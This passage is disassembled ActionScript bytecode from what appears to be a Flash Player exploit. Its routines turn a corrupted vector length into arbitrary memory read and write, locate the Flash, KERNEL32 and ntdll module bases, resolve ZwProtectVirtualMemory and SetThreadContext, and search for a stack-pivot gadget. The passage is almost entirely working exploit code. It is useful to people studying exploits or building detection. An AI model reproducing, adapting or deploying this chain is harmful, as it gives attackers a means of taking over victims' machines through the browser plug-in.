       48   pushfalse     	
       49   returnvalue   	
       
       L3: 
       50   inclocal_i    	4
       
       L1: 
       52   getlocal      	4
       54   getlocal3     	
       55   getproperty   	length //nameIndex = 76
       57   iflt          	L2

       61   pushtrue      	
       62   returnvalue   	
     }

     function private::getModuleBase(uint):uint	/* disp_id=0 method_id=18 nameIndex = 62 */
     {
       // local_count=3 max_scope=1 max_stack=2 code_len=47
       // method position=5398 code position=8834
       0    getlocal0     	
       1    pushscope     	
       2    getlocal1     	
       3    pushdouble    	4294901760
       5    bitand        	
       6    coerce_a      	
       7    setlocal2     	
       8    jump          	L1

       
       L2: 
       12   label         	
       13   getlocal0     	
       14   getlocal2     	
       15   callproperty  	private::read32 (1) //nameIndex = 53
       18   pushint       	65535	// 0xffff
       20   bitand        	
       21   pushshort     	23117
       25   ifne          	L3

       29   getlocal2     	
       30   returnvalue   	
       
       L3: 
       31   getlocal2     	
       32   pushint       	65536	// 0x10000
       34   subtract      	
       35   coerce_a      	
       36   setlocal2     	
       
       L1: 
       37   getlocal2     	
       38   pushbyte      	0
       40   ifgt          	L2

       44   pushbyte      	0
       46   returnvalue   	
     }

     function private::getModuleBaseFromIAT(uint,String,uint):uint	/* disp_id=0 method_id=19 nameIndex = 63 */
     {
       // local_count=10 max_scope=3 max_stack=6 code_len=189
       // method position=5403 code position=8889
       0    getlocal0     	
       1    pushscope     	
       2    pushbyte      	0
       4    convert_u     	
       5    setlocal      	6
       7    pushbyte      	0
       9    convert_u     	
       10   setlocal      	7
       12   pushbyte      	0
       14   convert_u     	
       15   setlocal      	8
       17   getlocal1     	
       18   getlocal0     	
       19   getlocal1     	
       20   getlocal0     	
       21   getlocal1     	
       22   pushbyte      	60
       24   add           	
       25   callproperty  	private::read32 (1) //nameIndex = 53
       28   add           	
       29   pushshort     	128
       32   add           	
       33   callproperty  	private::read32 (1) //nameIndex = 53
       36   add           	
       37   convert_u     	
       38   dup           	
       39   setlocal      	4
       41   convert_u     	
       42   setlocal      	5
       44   jump          	L1

       
       L2: 
       48   label         	
       49   getlocal1     	
       50   getlocal0     	
       51   getlocal      	5
       53   pushbyte      	12
       55   add           	
       56   callproperty  	private::read32 (1) //nameIndex = 53
       59   add           	
       60   convert_u     	
       61   setlocal      	6
       63   getlocal0     	
       64   getlocal      	6
       66   getlocal2     	
       67   callproperty  	private::asciiStrEqual (2) //nameIndex = 61
       70   iffalse       	L3

       74   getlocal1     	
       75   getlocal0     	
       76   getlocal      	5
       78   pushbyte      	16
       80   add           	
       81   callproperty  	private::read32 (1) //nameIndex = 53
       84   add           	
       85   convert_u     	
       86   setlocal      	7
       88   getlocal3     	
       89   pushbyte      	4
       91   multiply      	
       92   getlocal      	7
       94   add           	
       95   convert_u     	
       96   setlocal      	7
       98   getlocal0     	
       99   getlocal      	7
       101  callproperty  	private::read32 (1) //nameIndex = 53
       104  convert_u     	
       105  setlocal      	8
       107  jump          	L4

       
       L5: 
       111  label         	
       112  getlocal      	7
       114  pushbyte      	4
       116  add           	
       117  convert_u     	
       118  setlocal      	7
       120  getlocal0     	
       121  getlocal      	7
       123  callproperty  	private::read32 (1) //nameIndex = 53
       126  convert_u     	
       127  setlocal      	8
       
       L4: 
       129  pushbyte      	0
       131  getlocal      	8
       133  ifeq          	L5

       137  getlocal0     	
       138  getlocal      	8
       140  pushdouble    	4294901760
       142  bitand        	
       143  callproperty  	private::getModuleBase (1) //nameIndex = 62
       146  returnvalue   	
       
       L3: 
       147  jump          	L6

       151  getlocal0     	
       152  pushscope     	
       153  newcatch      	0
       155  dup           	
       156  setlocal      	9
       158  dup           	
       159  pushscope     	
       160  swap          	
       161  setslot       	1
       163  popscope      	
       164  kill          	9
       
       L6: 
       166  getlocal      	5
       168  pushbyte      	20
       170  add           	
       171  convert_u     	
       172  setlocal      	5
       
       L1: 
       174  getlocal      	5
       176  getlocal      	4
       178  pushshort     	256
       181  add           	
       182  iflt          	L2

       186  pushbyte      	0
       188  returnvalue   	
     }

     function private::getProcAddr(uint,String):uint	/* disp_id=0 method_id=20 nameIndex = 64 */
     {
       // local_count=12 max_scope=1 max_stack=6 code_len=176
       // method position=5410 code position=9094
       0    getlocal0     	
       1    pushscope     	
       2    pushundefined 	
       3    coerce_a      	
       4    setlocal      	9
       6    pushbyte      	0
       8    convert_u     	
       9    setlocal      	10
       11   pushbyte      	0
       13   convert_u     	
       14   setlocal      	11
       16   getlocal1     	
       17   getlocal0     	
       18   getlocal1     	
       19   getlocal0     	
       20   getlocal1     	
       21   pushbyte      	60
       23   add           	
       24   callproperty  	private::read32 (1) //nameIndex = 53
       27   add           	
       28   pushbyte      	120
       30   add           	
       31   callproperty  	private::read32 (1) //nameIndex = 53
       34   add           	
       35   convert_u     	
       36   setlocal3     	
       37   getlocal0     	
       38   getlocal3     	
       39   pushbyte      	24
       41   add           	
       42   callproperty  	private::read32 (1) //nameIndex = 53
       45   convert_u     	
       46   setlocal      	4
       48   getlocal1     	
       49   getlocal0     	
       50   getlocal3     	
       51   pushbyte      	28
       53   add           	
       54   callproperty  	private::read32 (1) //nameIndex = 53
       57   add           	
       58   convert_u     	
       59   setlocal      	5
       61   getlocal1     	
       62   getlocal0     	
       63   getlocal3     	
       64   pushbyte      	32
       66   add           	
       67   callproperty  	private::read32 (1) //nameIndex = 53
       70   add           	
       71   convert_u     	
       72   setlocal      	6
       74   getlocal1     	
       75   getlocal0     	
       76   getlocal3     	
       77   pushbyte      	36
       79   add           	
       80   callproperty  	private::read32 (1) //nameIndex = 53
       83   add           	
       84   convert_u     	
       85   setlocal      	7
       87   pushbyte      	0
       89   coerce_a      	
       90   setlocal      	8
       92   jump          	L1

       
       L2: 
       96   label         	
       97   getlocal0     	
       98   getlocal      	6
       100  getlocal      	8
       102  pushbyte      	4
       104  multiply      	
       105  add           	
       106  callproperty  	private::read32 (1) //nameIndex = 53
       109  getlocal1     	
       110  add           	
       111  coerce_a      	
       112  setlocal      	9
       114  getlocal0     	
       115  getlocal      	9
       117  getlocal2     	
       118  callproperty  	private::asciiStrEqual (2) //nameIndex = 61
       121  iffalse       	L3

       125  getlocal0     	
       126  getlocal      	7
       128  getlocal      	8
       130  pushbyte      	2
       132  multiply      	
       133  add           	
       134  callproperty  	private::read16 (1) //nameIndex = 56
       137  convert_u     	
       138  setlocal      	10
       140  getlocal0     	
       141  getlocal      	5
       143  getlocal      	10
       145  pushbyte      	4
       147  multiply      	
       148  add           	
       149  callproperty  	private::read32 (1) //nameIndex = 53
       152  getlocal1     	
       153  add           	
       154  convert_u     	
       155  dup           	
       156  setlocal      	11
       158  returnvalue   	
       
       L3: 
       159  getlocal      	8
       161  increment     	
       162  coerce_a      	
       163  setlocal      	8
       
       L1: 
       165  getlocal      	8
       167  getlocal      	4
       169  iflt          	L2

       173  pushbyte      	0
       175  returnvalue   	
     }

     function private::searchBytes(flash.utils::ByteArray,uint,uint):uint	/* disp_id=0 method_id=21 nameIndex = 65 */
     {
       // local_count=6 max_scope=1 max_stack=3 code_len=108
       // method position=5416 code position=9279
       0    getlocal0     	
       1    pushscope     	
       2    pushbyte      	0
       4    setlocal      	5
       6    getlocal2     	
       7    getlocal3     	
       8    greaterequals 	
       9    dup           	
       10   iftrue        	L1

       14   pop           	
       15   getlocal2     	
       16   getlocal1     	
       17   getproperty   	length //nameIndex = 76
       19   add           	
       20   getlocal3     	
       21   greaterthan   	
       
       L1: 
       22   iffalse       	L2

       26   pushbyte      	0
       28   returnvalue   	
       
       L2: 
       29   getlocal2     	
       30   convert_u     	
       31   setlocal      	4
       33   jump          	L3

       
       L4: 
       37   label         	
       38   pushbyte      	0
       40   setlocal      	5
       42   jump          	L5

       
       L6: 
       46   label         	
       47   getlocal0     	
       48   getlocal      	4
       50   getlocal      	5
       52   add           	
       53   callproperty  	private::read8 (1) //nameIndex = 55
       56   getlocal1     	
       57   getlocal      	5
       59   getproperty   	null //nameIndex = 75
       61   ifeq          	L7

       65   jump          	L8
       
       L7: 
       69   inclocal_i    	5
       
       L5: 
       71   getlocal      	5
       73   getlocal1     	
       74   getproperty   	length //nameIndex = 76
       76   iflt          	L6
       
       L8: 
       80   getlocal      	5
       82   getlocal1     	
       83   getproperty   	length //nameIndex = 76
       85   ifne          	L9

       89   getlocal      	4
       91   returnvalue   	
       
       L9: 
       92   getlocal      	4
       94   increment     	
       95   convert_u     	
       96   setlocal      	4
       
       L3: 
       98   getlocal      	4
       100  getlocal3     	
       101  iflt          	L4

       105  pushbyte      	0
       107  returnvalue   	
     }

     function private::hexToBin(String):flash.utils::ByteArray	/* disp_id=0 method_id=22 nameIndex = 66 */
     {
       // local_count=6 max_scope=1 max_stack=4 code_len=83
       // method position=5423 code position=9395
       0    getlocal0     	
       1    pushscope     	
       2    pushnull      	
       3    coerce_a      	
       4    setlocal2     	
       5    findpropstrict	flash.utils::ByteArray //nameIndex = 8
       7    constructprop 	flash.utils::ByteArray (0) //nameIndex = 8
       10   coerce_a      	
       11   setlocal3     	
       12   getlocal1     	
       13   getproperty   	length //nameIndex = 76
       15   coerce_a      	
       16   setlocal      	4
       18   pushbyte      	0
       20   coerce_a      	
       21   setlocal      	5
       23   getlocal3     	
       24   getlex        	flash.utils::Endian //nameIndex = 91
       26   getproperty   	LITTLE_ENDIAN //nameIndex = 92
       28   setproperty   	endian //nameIndex = 100
       30   jump          	L1

       
       L2: 
       34   label         	
       35   getlocal1     	
       36   getlocal      	5
       38   callproperty  	http://adobe.com/AS3/2006/builtin::charAt (1) //nameIndex = 89
       41   getlocal1     	
       42   getlocal      	5
       44   pushbyte      	1
       46   add           	
       47   callproperty  	http://adobe.com/AS3/2006/builtin::charAt (1) //nameIndex = 89
       50   add           	
       51   coerce_a      	
       52   setlocal2     	
       53   getlocal3     	
       54   findpropstrict	parseInt //nameIndex = 90
       56   getlocal2     	
       57   pushbyte      	16
       59   callproperty  	parseInt (2) //nameIndex = 90
       62   callpropvoid  	writeByte (1) //nameIndex = 101
       65   getlocal      	5
       67   pushbyte      	2
       69   add           	
       70   coerce_a      	
       71   setlocal      	5
       
       L1: 
       73   getlocal      	5
       75   getlocal      	4
       77   iflt          	L2

       81   getlocal3     	
       82   returnvalue   	
     }

     function private::proc(flash.events::TimerEvent):void	/* disp_id=0 method_id=23 nameIndex = 67 */
     {
       // local_count=46 max_scope=3 max_stack=5 code_len=1936
       // method position=5428 code position=9486
       0    getlocal0     	
       1    pushscope     	
       2    pushbyte      	0
       4    convert_u     	
       5    setlocal2     	
       6    pushbyte      	0
       8    convert_u     	
       9    setlocal3     	
       10   pushbyte      	0
       12   convert_u     	
       13   setlocal      	4
       15   pushbyte      	0
       17   convert_u     	
       18   setlocal      	5
       20   pushbyte      	0
       22   convert_u     	
       23   setlocal      	6
       25   pushbyte      	0
       27   convert_u     	
       28   setlocal      	7
       30   pushbyte      	0
       32   convert_u     	
       33   setlocal      	8
       35   pushbyte      	0
       37   convert_u     	
       38   setlocal      	9
       40   pushbyte      	0
       42   convert_u     	
       43   setlocal      	10
       45   pushbyte      	0
       47   convert_u     	
       48   setlocal      	11
       50   pushbyte      	0
       52   convert_u     	
       53   setlocal      	12
       55   pushbyte      	0
       57   convert_u     	
       58   setlocal      	13
       60   pushbyte      	0
       62   convert_u     	
       63   setlocal      	14
       65   pushbyte      	0
       67   convert_u     	
       68   setlocal      	15
       70   pushbyte      	0
       72   convert_u     	
       73   setlocal      	16
       75   pushbyte      	0
       77   convert_u     	
       78   setlocal      	17
       80   pushbyte      	0
       82   convert_u     	
       83   setlocal      	18
       85   pushbyte      	0
       87   convert_u     	
       88   setlocal      	19
       90   pushnull      	
       91   coerce_s      	
       92   setlocal      	20
       94   pushbyte      	0
       96   convert_u     	
       97   setlocal      	21
       99   pushbyte      	0
       101  convert_u     	
       102  setlocal      	22
       104  pushbyte      	0
       106  convert_u     	
       107  setlocal      	23
       109  pushbyte      	0
       111  setlocal      	25
       113  pushbyte      	0
       115  setlocal      	26
       117  pushbyte      	0
       119  setlocal      	27
       121  pushbyte      	0
       123  setlocal      	28
       125  pushbyte      	0
       127  convert_u     	
       128  setlocal      	30
       130  pushbyte      	0
       132  convert_u     	
       133  setlocal      	31
       135  pushbyte      	0
       137  convert_u     	
       138  setlocal      	32
       140  pushbyte      	0
       142  convert_u     	
       143  setlocal      	33
       145  pushbyte      	0
       147  setlocal      	37
       149  pushnull      	
       150  coerce        	flash.utils::ByteArray //nameIndex = 8
       152  setlocal      	38
       154  pushbyte      	0
       156  convert_u     	
       157  setlocal      	39
       159  pushbyte      	0
       161  convert_u     	
       162  setlocal      	40
       164  pushundefined 	
       165  coerce_a      	
       166  setlocal      	41
       168  pushbyte      	0
       170  convert_u     	
       171  setlocal      	42
       173  pushundefined 	
       174  coerce_a      	
       175  setlocal      	43
       177  getlocal1     	
       178  coerce_a      	
       179  setlocal      	24
       181  pushbyte      	0
       183  setlocal      	29
       185  pushint       	404238336	// 0x18183000
       187  coerce_a      	
       188  setlocal      	34
       190  pushshort     	4064
       193  coerce_a      	
       194  setlocal      	35
       196  pushint       	65536	// 0x10000
       198  coerce_a      	
       199  setlocal      	36
       201  pushint       	404238344	// 0x18183008
       203  convert_u     	
       204  setlocal      	12
       206  getlocal0     	
       207  getproperty   	private::found //nameIndex = 26
       209  convert_b     	
       210  dup           	
       211  iffalse       	L1

       215  pop           	
       216  getlocal0     	
       217  getproperty   	m_status //nameIndex = 29
       219  pushint       	65535	// 0xffff
       221  equals        	
       
       L1: 
       222  iffalse       	L2

       226  getlocal0     	
       227  getproperty   	private::work //nameIndex = 21
       229  callpropvoid  	stop (0) //nameIndex = 102
       232  returnvoid    	
       
       L2: 
       233  getlocal0     	
       234  getproperty   	m_status //nameIndex = 29
       236  pushbyte      	0
       238  ifne          	L3

       242  pushbyte      	0
       244  setlocal      	25
       246  jump          	L4

       
       L5: 
       250  label         	
       251  getlocal0     	
       252  getproperty   	s //nameIndex = 23
       254  getlocal      	25
       256  getproperty   	null //nameIndex = 75
       258  getlex        	Vector //nameIndex = 82
       260  getlex        	uint //nameIndex = 3
       262  applytype     	(1)
       264  astypelate    	
       265  getproperty   	length //nameIndex = 76
       267  getlocal0     	
       268  getproperty   	m_rawLen //nameIndex = 44
       270  ifngt         	L6

       274  jump          	L7
       
       L6: 
       278  jump          	L8

       282  getlocal0     	
       283  pushscope     	
       284  newcatch      	0
       286  dup           	
       287  setlocal      	44
       289  dup           	
       290  pushscope     	
       291  swap          	
       292  setslot       	1
       294  popscope      	
       295  kill          	44
       
       L8: 
       297  getlocal      	25
       299  pushbyte      	1
       301  add           	
       302  convert_i     	
       303  setlocal      	25
       
       L4: 
       305  getlocal      	25
       307  getlocal0     	
       308  getproperty   	m_suf //nameIndex = 45
       310  iflt          	L5
       
       L7: 
       314  getlocal      	25
       316  getlocal0     	
       317  getproperty   	m_suf //nameIndex = 45
       319  ifne          	L9

       323  returnvoid    	
       
       L9: 
       324  pushbyte      	1
       326  setlocal      	26
       328  pushbyte      	-1
       330  setlocal      	28
       332  getlocal0     	
       333  getproperty   	s //nameIndex = 23
       335  getlocal      	25
       337  getproperty   	null //nameIndex = 75
       339  pushshort     	4096
       342  getlocal      	26
       344  multiply      	
       345  pushbyte      	4
       347  divide        	
       348  pushbyte      	2
       350  subtract      	
       351  pushint       	1073741808	// 0x3ffffff0
       353  setproperty   	null //nameIndex = 75
       355  pushbyte      	0
       357  setlocal      	37
       359  jump          	L10

       
       L11: 
       363  label         	
       364  getlocal0     	
       365  getproperty   	s //nameIndex = 23
       367  getlocal      	37
       369  getproperty   	null //nameIndex = 75
       371  getproperty   	length //nameIndex = 103
       373  pushint       	1073741808	// 0x3ffffff0
       375  ifne          	L12

       379  getlocal      	37
       381  convert_i     	
       382  setlocal      	28
       384  getlocal      	12
       386  pushshort     	4096
       389  add           	
       390  convert_u     	
       391  setlocal      	12
       393  jump          	L13
       
       L12: 
       397  inclocal_i    	37
       
       L10: 
       399  getlocal      	37
       401  getlocal0     	
       402  getproperty   	s //nameIndex = 23
       404  getproperty   	length //nameIndex = 76
       406  iflt          	L11
       
       L13: 
       410  getlocal      	28
       412  pushbyte      	-1
       414  ifne          	L14

       418  returnvoid    	
       
       L14: 
       419  getlocal0     	
       420  getlocal      	12
       422  setproperty   	private::m_longArrBase //nameIndex = 30
       424  getlocal0     	
       425  getlocal      	28
       427  setproperty   	private::m_longArrIdx //nameIndex = 31
       429  getlocal0     	
       430  getlocal      	34
       432  getlocal0     	
       433  getproperty   	m_rawLen //nameIndex = 44
       435  callpropvoid  	private::write32 (2) //nameIndex = 54
       438  getlocal0     	
       439  dup           	
       440  setlocal      	44
       442  getproperty   	m_status //nameIndex = 29
       444  increment     	
       445  setlocal      	45
       447  getlocal      	44
       449  getlocal      	45
       451  setproperty   	m_status //nameIndex = 29
       453  kill          	45
       455  kill          	44
       
       L3: 
       457  getlocal0     	
       458  getproperty   	m_status //nameIndex = 29
       460  pushbyte      	1
       462  ifne          	L15

       466  getlocal0     	
       467  getproperty   	private::m_longArrBase //nameIndex = 30
       469  pushshort     	4088
       472  add           	
       473  pushshort     	4096
       476  add           	
       477  convert_u     	
       478  setlocal      	9
       480  pushbyte      	0
       482  setlocal      	25
       484  jump          	L16

       
       L17: 
       488  label         	
       489  getlocal      	9
       491  getlocal      	25
       493  pushshort     	4096
       496  multiply      	
       497  add           	
       498  pushint       	65536	// 0x10000
       500  modulo        	
       501  pushbyte      	0
       503  equals        	
       504  dup           	
       505  iffalse       	L18

       509  pop           	
       510  getlocal0     	
       511  getlocal      	9
       513  getlocal      	25
       515  pushshort     	4096
       518  multiply      	
       519  add           	
       520  callproperty  	private::read32 (1) //nameIndex = 53
       523  getlocal0     	
       524  getproperty   	m_rawLen //nameIndex = 44
       526  equals        	
       527  not           	
       
       L18: 
       528  dup           	
       529  iffalse       	L19

       533  pop           	
       534  getlocal0     	
       535  getlocal      	9
       537  getlocal      	25
       539  pushshort     	4096
       542  multiply      	
       543  add           	
       544  pushbyte      	4
       546  add           	
       547  callproperty  	private::read32 (1) //nameIndex = 53
       550  getlocal      	35
       552  equals        	
       553  not           	
       
       L19: 
       554  iffalse       	L20

       558  getlocal      	9
       560  pushint       	65536	// 0x10000
       562  add           	
       563  convert_u     	
       564  setlocal      	9
       566  getlocal      	25
       568  pushbyte      	0
       570  ifeq          	L21

       574  getlocal      	25
       576  decrement     	
       577  convert_i     	
       578  setlocal      	25
       
       L21: 
       580  jump          	L22
       
       L20: 
       584  getlocal0     	
       585  getlocal      	9
       587  getlocal      	25
       589  pushshort     	4096
       592  multiply      	
       593  add           	
       594  pushbyte      	4
       596  add           	
       597  callproperty  	private::read32 (1) //nameIndex = 53
       600  getlocal      	35
       602  equals        	
       603  dup           	
       604  iffalse       	L23

       608  pop           	
       609  getlocal0     	
       610  getlocal      	9
       612  getlocal      	25
       614  pushshort     	4096
       617  multiply      	
       618  add           	
       619  pushbyte      	4
       621  pushbyte      	17
       623  multiply      	
       624  add           	
       625  callproperty  	private::read32 (1) //nameIndex = 53
       628  pushbyte      	0
       630  greaterthan   	
       
       L23: 
       631  dup           	
       632  iffalse       	L24

       636  pop           	
       637  getlocal0     	
       638  getlocal      	9
       640  getlocal      	25
       642  pushshort     	4096
       645  multiply      	
       646  add           	
       647  pushbyte      	4
       649  pushbyte      	17
       651  multiply      	
       652  add           	
       653  callproperty  	private::read32 (1) //nameIndex = 53
       656  getlocal0     	
       657  getlocal      	9
       659  getlocal      	25
       661  pushshort     	4096
       664  multiply      	
       665  add           	
       666  pushbyte      	4
       668  pushbyte      	100
       670  multiply      	
       671  add           	
       672  callproperty  	private::read32 (1) //nameIndex = 53
       675  equals        	
       
       L24: 
       676  iffalse       	L22

       680  getlocal0     	
       681  getlocal      	9
       683  getlocal      	25
       685  pushshort     	4096
       688  multiply      	
       689  add           	
       690  pushbyte      	4
       692  pushbyte      	17
       694  multiply      	
       695  add           	
       696  callproperty  	private::read32 (1) //nameIndex = 53
       699  convert_u     	
       700  setlocal      	9
       702  jump          	L25
       
       L22: 
       706  jump          	L26

       710  getlocal0     	
       711  pushscope     	
       712  newcatch      	1
       714  dup           	
       715  setlocal      	44
       717  dup           	
       718  pushscope     	
       719  swap          	
       720  setslot       	1
       722  popscope      	
       723  kill          	44
       
       L26: 
       725  getlocal      	25
       727  pushbyte      	1
       729  add           	
       730  convert_i     	
       731  setlocal      	25
       
       L16: 
       733  getlocal      	25
       735  getlocal      	36
       737  iflt          	L17
       
       L25: 
       741  getlocal      	25
       743  getlocal      	36
       745  ifne          	L27

       749  returnvoid    	
       
       L27: 
       750  getlocal      	9
       752  pushdouble    	4294967292
       754  bitand        	
       755  convert_u     	
       756  dup           	
       757  setlocal      	9
       759  convert_u     	
       760  setlocal      	16
       762  getlocal0     	
       763  getlocal      	16
       765  setproperty   	private::m_flashVirtual //nameIndex = 33
       767  getlocal0     	
       768  getlocal0     	
       769  getlocal      	9
       771  callproperty  	private::read32 (1) //nameIndex = 53
       774  pushdouble    	4294901760
       776  bitand        	
       777  callproperty  	private::getModuleBase (1) //nameIndex = 62
       780  convert_u     	
       781  dup           	
       782  setlocal      	17
       784  pushbyte      	0
       786  ifne          	L28

       790  getlex        	flash.external::ExternalInterface //nameIndex = 77
       792  pushstring    	"errorRepro"
       794  pushstring    	"can't search the module base!"
       796  callpropvoid  	call (2) //nameIndex = 78
       799  returnvoid    	
       
       L28: 
       800  getlocal0     	
       801  getlocal      	17
       803  setproperty   	private::m_flashBase //nameIndex = 32
       805  getlocal0     	
       806  dup           	
       807  setlocal      	44
       809  getproperty   	m_status //nameIndex = 29
       811  increment     	
       812  setlocal      	45
       814  getlocal      	44
       816  getlocal      	45
       818  setproperty   	m_status //nameIndex = 29
       820  kill          	45
       822  kill          	44
       
       L15: 
       824  getlocal0     	
       825  getproperty   	m_status //nameIndex = 29
       827  pushbyte      	2
       829  ifne          	L29

       833  getlocal0     	
       834  getlocal0     	
       835  getproperty   	private::m_flashBase //nameIndex = 32
       837  pushstring    	"KERNEL32"
       839  pushbyte      	0
       841  callproperty  	private::getModuleBaseFromIAT (3) //nameIndex = 63
       844  convert_u     	
       845  dup           	
       846  setlocal      	4
       848  pushbyte      	0
       850  ifne          	L30

       854  returnvoid    	
       
       L30: 
       855  getlocal0     	
       856  getlocal      	4
       858  setproperty   	private::m_kernel32Base //nameIndex = 34
       860  getlocal0     	
       861  dup           	
       862  setlocal      	44
       864  getproperty   	m_status //nameIndex = 29
       866  increment     	
       867  setlocal      	45
       869  getlocal      	44
       871  getlocal      	45
       873  setproperty   	m_status //nameIndex = 29
       875  kill          	45
       877  kill          	44
       
       L29: 
       879  getlocal0     	
       880  getproperty   	m_status //nameIndex = 29
       882  pushbyte      	3
       884  ifne          	L31

       888  getlocal0     	
       889  getlocal0     	
       890  getproperty   	private::m_kernel32Base //nameIndex = 34
       892  pushstring    	"ntdll"
       895  pushbyte      	0
       897  callproperty  	private::getModuleBaseFromIAT (3) //nameIndex = 63
       900  convert_u     	
       901  setlocal3     	
       902  getlocal3     	
       903  pushbyte      	0
       905  ifne          	L32

       909  returnvoid    	
       
       L32: 
       910  getlocal0     	
       911  getlocal3     	
       912  setproperty   	private::m_ntdllBase //nameIndex = 35
       914  getlocal0     	
       915  dup           	
       916  setlocal      	44
       918  getproperty   	m_status //nameIndex = 29
       920  increment     	
       921  setlocal      	45
       923  getlocal      	44
       925  getlocal      	45
       927  setproperty   	m_status //nameIndex = 29
       929  kill          	45
       931  kill          	44
       
       L31: 
       933  getlocal0     	
       934  getproperty   	m_status //nameIndex = 29
       936  pushbyte      	4
       938  ifne          	L33

       942  getlocal0     	
       943  getlocal0     	
       944  getproperty   	private::m_ntdllBase //nameIndex = 35
       946  pushstring    	"ZwProtectVirtualMemory"
       949  callproperty  	private::getProcAddr (2) //nameIndex = 64
       952  convert_u     	
       953  dup           	
       954  setlocal      	10
       956  pushbyte      	0
       958  ifne          	L34

       962  returnvoid    	
       
       L34: 
       963  getlocal0     	
       964  getlocal      	10
       966  setproperty   	private::m_ZwProtectAddr //nameIndex = 36
       968  getlocal0     	
       969  dup           	
       970  setlocal      	44
       972  getproperty   	m_status //nameIndex = 29
       974  increment     	
       975  setlocal      	45
       977  getlocal      	44
       979  getlocal      	45
       981  setproperty   	m_status //nameIndex = 29
       983  kill          	45
       985  kill          	44
       
       L33: 
       987  getlocal0     	
       988  getproperty   	m_status //nameIndex = 29
       990  pushbyte      	5
       992  ifne          	L35

       996  getlocal0     	
       997  getlocal0     	
       998  getproperty   	private::m_ntdllBase //nameIndex = 35
       1000 pushbyte      	60
       1002 add           	
       1003 callproperty  	private::read32 (1) //nameIndex = 53
       1006 convert_u     	
       1007 setlocal      	13
       1009 getlocal0     	
       1010 getlocal0     	
       1011 getproperty   	private::m_ntdllBase //nameIndex = 35
       1013 getlocal      	13
       1015 add           	
       1016 pushshort     	264
       1019 add           	
       1020 callproperty  	private::read32 (1) //nameIndex = 53
       1023 convert_u     	
       1024 setlocal      	14
       1026 getlocal0     	
       1027 getlocal0     	
       1028 getproperty   	private::m_ntdllBase //nameIndex = 35
       1030 getlocal      	13
       1032 add           	
       1033 pushshort     	260
       1036 add           	
       1037 callproperty  	private::read32 (1) //nameIndex = 53
       1040 convert_u     	
       1041 setlocal      	13
       1043 getlocal0     	
       1044 getproperty   	private::m_ntdllBase //nameIndex = 35
       1046 getlocal      	13
       1048 add           	
       1049 convert_u     	
       1050 setlocal      	13
       1052 getlocal0     	
       1053 getproperty   	private::m_ntdllBase //nameIndex = 35
       1055 getlocal      	14
       1057 add           	
       1058 convert_u     	
       1059 setlocal      	14
       1061 findpropstrict	flash.utils::ByteArray //nameIndex = 8
       1063 constructprop 	flash.utils::ByteArray (0) //nameIndex = 8
       1066 coerce        	flash.utils::ByteArray //nameIndex = 8
       1068 dup           	
       1069 setlocal      	38
       1071 getlex        	flash.utils::Endian //nameIndex = 91
       1073 getproperty   	LITTLE_ENDIAN //nameIndex = 92
       1075 setproperty   	endian //nameIndex = 93
       1077 getlocal      	38
       1079 pushint       	50068	// 0xc394
       1081 callpropvoid  	writeShort (1) //nameIndex = 96
       1084 getlocal0     	
       1085 getlocal      	38
       1087 getlocal      	13
       1089 getlocal      	14
       1091 callproperty  	private::searchBytes (3) //nameIndex = 65
       1094 convert_u     	
       1095 dup           	
       1096 setlocal      	15
       1098 pushbyte      	0
       1100 ifne          	L36

       1104 returnvoid    	
       
       L36: 
       1105 getlocal0     	
       1106 getlocal      	15
       1108 setproperty   	private::m_xchgInstAddr //nameIndex = 37
       1110 getlocal0     	
       1111 dup           	
       1112 setlocal      	44
       1114 getproperty   	m_status //nameIndex = 29
       1116 increment     	
       1117 setlocal      	45
       1119 getlocal      	44
       1121 getlocal      	45
       1123 setproperty   	m_status //nameIndex = 29
       1125 kill          	45
       1127 kill          	44
       
       L35: 
       1129 getlocal0     	
       1130 getproperty   	m_status //nameIndex = 29
       1132 pushbyte      	6
       1134 ifne          	L37

       1138 getlocal0     	
       1139 getlocal0     	
       1140 getlocal0     	
       1141 getproperty   	private::m_kernel32Base //nameIndex = 34
       1143 pushstring    	"SetThreadContext"
       1146 callproperty  	private::getProcAddr (2) //nameIndex = 64
       1149 setproperty   	private::m_SetThreadContext //nameIndex = 38
       1151 getlocal0     	
       1152 getproperty   	private::m_SetThreadContext //nameIndex = 38
       1154 pushbyte      	0
       1156 ifne          	L38

       1160 pushbyte      	0
       1162 convert_u     	
       1163 setlocal      	40
       1165 getlocal0     	
       1166 getproperty   	private::m_kernel32Base //nameIndex = 34
       1168 convert_u     	
       1169 setlocal      	39
       1171 pushbyte      	0
       1173 convert_u     	
       1174 setlocal      	40
       1176 jump          	L39

       
       L40: 
       1180 label         	
       1181 getlocal0     	
       1182 getlocal0     	
       1183 getlocal      	39
       1185 pushstring    	"KERNEL32"
       1187 getlocal      	40
       1189 callproperty  	private::getModuleBaseFromIAT (3) //nameIndex = 63
       1192 setproperty   	private::m_kernel32Base //nameIndex = 34
       1194 getlocal0     	
       1195 getproperty   	private::m_kernel32Base //nameIndex = 34
       1197 pushbyte      	0
       1199 ifne          	L41

       1203 jump          	L42
       
       L41: 
       1207 getlocal0     	
       1208 getlocal0     	
       1209 getlocal0     	
       1210 getproperty   	private::m_kernel32Base //nameIndex = 34
       1212 pushstring    	"SetThreadContext"
       1215 callproperty  	private::getProcAddr (2) //nameIndex = 64
       1218 setproperty   	private::m_SetThreadContext //nameIndex = 38
       1220 getlocal0     	
       1221 getproperty   	private::m_SetThreadContext //nameIndex = 38
       1223 pushbyte      	0
       1225 ifeq          	L42

       1229 jump          	L43
       
       L42: 
       1233 getlocal      	40
       1235 increment     	
       1236 convert_u     	
       1237 setlocal      	40
       
       L39: 
       1239 getlocal      	40
       1241 pushbyte      	100
       1243 iflt          	L40
       
       L43: 
       1247 getlocal0     	
       1248 getproperty   	private::m_SetThreadContext //nameIndex = 38
       1250 pushbyte      	0
       1252 ifne          	L38

       1256 returnvoid    	
       
       L38: 
       1257 getlocal0     	
       1258 dup           	
       1259 setlocal      	44
       1261 getproperty   	m_status //nameIndex = 29
       1263 increment     	
       1264 setlocal      	45
       1266 getlocal      	44
       1268 getlocal      	45
       1270 setproperty   	m_status //nameIndex = 29
       1272 kill          	45
       1274 kill          	44
       
       L37: 
       1276 getlocal0     	
       1277 getproperty   	m_status //nameIndex = 29
       1279 pushbyte      	7
       1281 ifne          	L44

       1285 getlocal0     	
       1286 getproperty   	private::m_flashVirtual //nameIndex = 33
       1288 convert_u     	
       1289 setlocal      	9
       1291 getlocal0     	
       1292 getlocal      	9
       1294 callproperty  	private::read32 (1) //nameIndex = 53
       1297 convert_u     	
       1298 setlocal      	7
       1300 getlocal0     	
